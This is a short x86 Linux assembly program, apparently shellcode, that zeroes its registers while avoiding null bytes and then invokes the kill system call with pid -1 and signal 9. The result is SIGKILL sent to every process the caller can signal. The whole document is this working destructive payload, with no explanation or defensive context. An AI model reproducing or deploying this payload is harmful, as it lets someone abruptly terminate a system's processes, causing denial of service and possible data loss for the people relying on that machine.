global _start

section .text

_start:

	sub eax, eax
	mov ebx, eax	
	mov ecx, eax

	mov al, 0x25
	
	dec ebx

	mov cl, 0x9	

	int 0x80
